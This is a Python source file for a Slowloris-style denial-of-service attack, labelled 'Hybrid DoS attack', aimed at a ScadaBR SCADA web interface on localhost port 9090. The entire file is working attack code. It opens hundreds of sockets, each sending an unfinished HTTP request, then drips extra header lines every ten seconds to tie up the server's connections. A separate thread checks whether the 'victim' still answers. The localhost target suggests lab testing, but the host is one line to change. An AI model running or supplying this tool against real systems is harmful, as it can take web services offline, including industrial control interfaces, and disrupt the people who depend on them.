import socket
import time
import threading
import sys
import errno
from datetime import datetime


class HybridDoSAttack:
    def __init__(self):
        self.host = "localhost"
        self.port = 9090
        self.path = "/ScadaBR"
        self.max_descriptors = 900
        self.running = True
        self.active_connections = []
        self.connection_lock = threading.Lock()
        self.stats = {
            'total_created': 0,
            'total_closed': 0,
            'errors': 0,
            'timeouts': 0,
            'connection_refused': 0,
            'connection_reset': 0,
            'other_errors': 0,
            'successful_connects': 0,
            'keepalive_sent': 0,
            'reconnections': 0
        }
        self.start_time = time.time()

    def log(self, message, level="INFO"):
        """Logger"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")

    def update_status_display(self):
        """Print short status of attack"""
        with self.connection_lock:
            active_count = len([c for c in self.active_connections if c['socket']])

        uptime = time.time() - self.start_time
        hours = int(uptime // 3600)
        minutes = int((uptime % 3600) // 60)
        seconds = int(uptime % 60)

        status_line = (f"STATUS: Active: {active_count}/{self.max_descriptors} | "
                       f"Created: {self.stats['total_created']} | "
                       f"Errors: {self.stats['errors']} | "
                       f"Uptime: {hours:02d}:{minutes:02d}:{seconds:02d} | "
                       f"Success: {self.stats['successful_connects']}")
        print(status_line)

    def print_detailed_stats(self):
        """Print detailed statistics of attack"""
        print("\n" + "=" * 80)
        print("DETAILED STATISTICS:")
        print("=" * 80)
        print(f"Active connections: {len([c for c in self.active_connections if c['socket']])}")
        print(f"Total connections created: {self.stats['total_created']}")
        print(f"Total connections closed: {self.stats['total_closed']}")
        print(f"Successful connects: {self.stats['successful_connects']}")
        print(f"Keep-alive packets sent: {self.stats['keepalive_sent']}")
        print(f"Reconnection attempts: {self.stats['reconnections']}")
        print(f"\nERRORS:")
        print(f"  Timeouts: {self.stats['timeouts']}")
        print(f"  Connection refused: {self.stats['connection_refused']}")
        print(f"  Connection reset: {self.stats['connection_reset']}")
        print(f"  Other errors: {self.stats['other_errors']}")
        print(f"  Total errors: {self.stats['errors']}")
        print("=" * 80)

    def create_connection(self, conn_id):
        """Create connection with error processing"""
        try:
            # Check file descriptor limit
            with self.connection_lock:
                active_count = len([c for c in self.active_connections if c['socket']])
                if active_count >= self.max_descriptors:
                    self.log(f"Reached descriptor limit ({active_count}), skipping new connection", "WARN")
                    return None

            # Create socket
            start_time = time.time()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)

            # Try to connect
            sock.connect((self.host, self.port))
            connect_time = (time.time() - start_time) * 1000

            # Build partial HTTP request
            request = f"GET {self.path} HTTP/1.1\r\n"
            request += f"Host: {self.host}:{self.port}\r\n"
            request += "User-Agent: Managed-Slowloris/1.0\r\n"
            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            request += "Accept-Language: en-US,en;q=0.5\r\n"
            request += "Accept-Encoding: gzip, deflate\r\n"
            request += "Connection: keep-alive\r\n"
            # Do NOT send ending \r\n

            # Send incomplete request
            sock.send(request.encode())

            self.stats['successful_connects'] += 1
            self.stats['total_created'] += 1

            self.log(f"Connection #{conn_id} established in {connect_time:.0f}ms", "SUCCESS")

            return {
                'id': conn_id,
                'socket': sock,
                'created': time.time(),
                'last_activity': time.time(),
                'bytes_sent': len(request),
                'errors': 0
            }

        except socket.timeout:
            self.stats['timeouts'] += 1
            self.stats['errors'] += 1
            self.log(f"Connection #{conn_id} timeout", "ERROR")
            return None

        except ConnectionRefusedError:
            self.stats['connection_refused'] += 1
            self.stats['errors'] += 1
            self.log(f"Connection #{conn_id} refused by server", "ERROR")
            return None

        except ConnectionResetError:
            self.stats['connection_reset'] += 1
            self.stats['errors'] += 1
            self.log(f"Connection #{conn_id} reset by peer", "ERROR")
            return None

        except socket.error as e:
            self.stats['other_errors'] += 1
            self.stats['errors'] += 1
            error_name = errno.errorcode.get(e.errno, str(e.errno))
            self.log(f"Connection #{conn_id} socket error: {error_name} - {str(e)}", "ERROR")
            return None

        except Exception as e:
            self.stats['other_errors'] += 1
            self.stats['errors'] += 1
            self.log(f"Connection #{conn_id} unexpected error: {type(e).__name__}: {str(e)}", "ERROR")
            return None

    def maintain_connections(self):
        """Maintain connections and send keep-alive"""
        cycle = 0

        while self.running:
            cycle += 1
            time.sleep(10)  # Maintaining loop each 10 seconds

            with self.connection_lock:
                active_conns = [c for c in self.active_connections if c['socket']]

            self.log(f"Maintenance cycle #{cycle}: {len(active_conns)} active connections", "INFO")

            # Send keep-alive for each connection
            for conn in list(active_conns):
                if not self.running:
                    break

                try:
                    # Send additional header
                    keepalive_msg = f"X-KeepAlive-{cycle}: {time.time()}\r\n"
                    conn['socket'].send(keepalive_msg.encode())
                    conn['last_activity'] = time.time()
                    conn['bytes_sent'] += len(keepalive_msg)
                    self.stats['keepalive_sent'] += 1

                except socket.timeout:
                    self.log(f"Connection #{conn['id']} timeout during keep-alive", "WARN")
                    self.close_connection(conn['id'], "timeout")

                except ConnectionResetError:
                    self.log(f"Connection #{conn['id']} reset during keep-alive", "WARN")
                    self.close_connection(conn['id'], "reset")

                except socket.error as e:
                    error_name = errno.errorcode.get(e.errno, str(e.errno))
                    self.log(f"Connection #{conn['id']} error during keep-alive: {error_name}", "WARN")
                    self.close_connection(conn['id'], "socket_error")

                except Exception as e:
                    self.log(f"Connection #{conn['id']} unexpected error: {type(e).__name__}", "WARN")
                    self.close_connection(conn['id'], "unexpected_error")

            # Show statistics
            if cycle % 6 == 0:  # Each minute (6 * 10 seconds)
                self.print_detailed_stats()

            # Update status line
            self.update_status_display()

    def connection_creator(self):
        """Thread for connection creation"""
        conn_id = 0

        while self.running:
            with self.connection_lock:
                active_count = len([c for c in self.active_connections if c['socket']])

            # If we have less than 80% of file descriptors limit, then create new connections
            if active_count < self.max_descriptors * 0.8:
                batch_size = min(10, self.max_descriptors - active_count)

                for _ in range(batch_size):
                    if not self.running:
                        break

                    conn_id += 1
                    conn = self.create_connection(conn_id)

                    if conn:
                        with self.connection_lock:
                            self.active_connections.append(conn)

                    # Delay between new connections
                    time.sleep(0.1)

            else:
                # Wait if reached file descriptor limit
                time.sleep(5)

            self.update_status_display()

    def monitor_server(self):
        """Monitor victim availability"""
        monitor_id = 0

        while self.running:
            monitor_id += 1
            start_time = time.time()

            try:
                # Create temporary socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.host, self.port))

                # Send plain GET request
                request = f"GET {self.path} HTTP/1.0\r\n\r\n"
                sock.send(request.encode())

                # Try to receive response
                response = sock.recv(1024)
                sock.close()

                response_time = (time.time() - start_time) * 1000

                if response:
                    status = f"Monitor #{monitor_id}: Server responded in {response_time:.0f}ms"
                    self.log(status, "MONITOR")
                else:
                    self.log(f"Monitor #{monitor_id}: Empty response", "MONITOR_WARN")

            except socket.timeout:
                self.log(f"Monitor #{monitor_id}: Timeout after 3s", "MONITOR_WARN")

            except ConnectionRefusedError:
                self.log(f"Monitor #{monitor_id}: Connection refused - server may be down!", "MONITOR_ERROR")

            except Exception as e:
                self.log(f"Monitor #{monitor_id}: Error - {type(e).__name__}", "MONITOR_WARN")

            time.sleep(15)

    def close_connection(self, conn_id, reason="manual"):
        """Close connection by ID"""
        with self.connection_lock:
            for i, conn in enumerate(self.active_connections):
                if conn['id'] == conn_id and conn['socket']:
                    try:
                        conn['socket'].close()
                        self.stats['total_closed'] += 1
                        lifetime = time.time() - conn['created']
                        self.log(f"Connection #{conn_id} closed after {lifetime:.1f}s (reason: {reason})", "INFO")
                    except:
                        pass
                    finally:
                        self.active_connections[i]['socket'] = None
                    break

    def cleanup_dead_connections(self):
        """Remove ded connections form list"""
        while self.running:
            time.sleep(30)

            with self.connection_lock:
                before = len(self.active_connections)
                self.active_connections = [c for c in self.active_connections if c['socket']]
                after = len(self.active_connections)

                if before != after:
                    cleaned = before - after
                    self.log(f"Cleaned up {cleaned} dead connections", "INFO")

    def run(self):
        print("=" * 80)
        print(f"Target: http://{self.host}:{self.port}{self.path}")
        print(f"Max file descriptors: {self.max_descriptors}")
        print("All errors will be logged to console")
        print("=" * 80)

        self.start_time = time.time()
        self.log("Attack starting...", "INIT")

        threads = []

        # Thread for connection creation
        creator_thread = threading.Thread(target=self.connection_creator, daemon=True)
        creator_thread.start()
        threads.append(creator_thread)

        # Thread for connection maintaining
        maintain_thread = threading.Thread(target=self.maintain_connections, daemon=True)
        maintain_thread.start()
        threads.append(maintain_thread)

        # Thread for victim monitoring
        monitor_thread = threading.Thread(target=self.monitor_server, daemon=True)
        monitor_thread.start()
        threads.append(monitor_thread)

        # Thread for connection cleanup
        cleanup_thread = threading.Thread(target=self.cleanup_dead_connections, daemon=True)
        cleanup_thread.start()
        threads.append(cleanup_thread)

        self.log(f"Started {len(threads)} worker threads", "INIT")

        try:
            while self.running:
                self.update_status_display()
                time.sleep(5)

        except KeyboardInterrupt:
            print("\n\n" + "=" * 80)
            self.log("Ctrl+C detected, stopping attack...", "SHUTDOWN")
            self.running = False

            # Wait for threads finish
            time.sleep(2)
            self.close_all_connections()

            # Final statistics
            self.print_detailed_stats()

            print("\nAttack stopped successfully.")
            print("=" * 80)

    def close_all_connections(self):
        """Close all active connections"""
        self.log("Closing all connections...", "SHUTDOWN")

        with self.connection_lock:
            active_count = len([c for c in self.active_connections if c['socket']])

            for conn in self.active_connections:
                if conn['socket']:
                    try:
                        conn['socket'].close()
                        self.stats['total_closed'] += 1
                    except:
                        pass

            self.active_connections = []

        self.log(f"Closed {active_count} connections", "SHUTDOWN")


if __name__ == "__main__":
    print("\n" + "=" * 80)
    print("Hybrid DoS attack (Slowloris based)")
    print("=" * 80)

    try:
        attack = HybridDoSAttack()
        attack.run()
    except Exception as e:
        print(f"\nFATAL ERROR: {type(e).__name__}: {str(e)}")
        import traceback

        traceback.print_exc()
